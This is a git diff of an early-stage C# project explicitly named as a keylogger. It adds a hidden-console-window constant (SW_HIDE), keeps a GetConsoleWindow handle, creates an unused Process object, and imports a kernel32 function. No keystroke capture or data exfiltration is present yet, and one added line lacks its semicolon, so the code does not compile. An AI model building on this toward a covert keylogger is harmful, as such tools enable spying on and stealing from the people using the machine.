@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using System.Diagnostics
 
 namespace C__keylogger
 {
@@ -9,9 +10,10 @@ namespace C__keylogger
     {
         static void Main(string[] args)
         {
-            const int hidvalue = 0;
+            const int SW_HIDE = 0;
             var hideMe = GetConsoleWindow();
-            Console.WriteLine("Hello World!");
+            //Console.WriteLine("Hello World!");
+            Process cmd = new Process();
         }
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] //kernel32:It handles memory management, input/output operations, and interrupts
         private static extern IntPtr GetModuleHandle(string lpModuleName); //about Extern: The extern modifier is typically used in conjunction with a DllImport attribute, allowing external methods to be implemented by DLLs (Dynamic Link Libraries). 
